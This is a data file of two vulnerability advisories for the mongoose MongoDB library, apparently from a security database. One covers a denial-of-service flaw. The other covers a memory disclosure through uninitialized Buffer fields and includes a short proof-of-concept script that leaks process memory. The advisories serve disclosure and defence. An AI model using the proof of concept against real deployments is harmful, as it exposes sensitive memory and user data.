  title: Denial of Service (DoS)
  description: |+
    [`mongoose`][1] is a MongoDB ODM. Affected versions of the package are
    vulnerable to Denial of Service (DoS) via Infinite Loop when calculating
    a corrupt array. An attacker can use this to his advantage to crash the
    servers.



    [1]: https://www.npmjs.com/package/mongoose
    \nDenial of Service (DoS) describes a family of attacks, all aimed at
    making a system inaccessible to its intended and legitimate users.

    Unlike other vulnerabilities, DoS attacks usually do not aim at
    breaching security. Rather, they are focused on making websites and
    services unavailable to genuine users resulting in downtime.

    One popular Denial of Service vulnerability is DDoS (a Distributed
    Denial of Service), an attack that attempts to clog network pipes to the
    system by generating a large volume of traffic from many machines.

    When it comes to open source libraries, DoS vulnerabilities allow
    attackers to trigger such a crash or crippling of the service by using a
    flaw either in the application code or from the use of open source
    libraries.

    Two common types of DoS vulnerabilities:

    * High CPU/Memory Consumption- An attacker sending crafted requests that
      could cause the system to take a disproportionate amount of time to
      process. For example,
      [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

    * Crash - An attacker sending crafted requests that could cause the
      system to crash. For Example, [npm `ws` package](npm:ws:20171108)

  title: Remote Memory Exposure
  description: "A potential memory disclosure vulnerability exists in mongoose. A\n`Buffer`
    field in a MongoDB document can be used to expose sensitive\ninformation such
    as code, runtime memory and user data into MongoDB.\n\n### Details   {#details}\n\nInitializing
    a `Buffer` field in a document with integer `N` creates a\n`Buffer` of length
    `N` with non zero-ed out memory. **Example:**\n\n    var x = new Buffer(100);
    // uninitialized Buffer of length 100\n    // vs\n    var x = new Buffer('100');
    // initialized Buffer with value of '100'\n\nInitializing a MongoDB document field
    in such manner will dump\nuninitialized memory into MongoDB. The patch wraps `Buffer`
    field\ninitialization in mongoose by converting a `number` value `N` to array\n`[N]`,
    initializing the `Buffer` with `N` in its binary form.\n\n#### Proof of concept
    \  {#proof-of-concept}\n\n    var mongoose = require('mongoose');\n    mongoose.connect('mongodb://localhost/bufftest');\n
    \   \n    // data: Buffer is not uncommon, taken straight from the docs: http://mongoosejs.com/docs/schematypes.html\n
    \   mongoose.model('Item', new mongoose.Schema({id: String, data: Buffer}));\n
    \   \n    var Item = mongoose.model('Item');\n    \n    var sample = new Item();\n
    \   sample.id = 'item1';\n    \n    // This will create an uninitialized buffer
    of size 100\n    sample.data = 100;\n    sample.save(function () {\n        Item.findOne(function
    (err, result) {\n            // Print out the data (exposed memory)\n            console.log(result.data.toString('ascii'))\n
    \           mongoose.connection.db.dropDatabase(); // Clean up everything\n            process.exit();\n
    \       });\n    });\n\n"
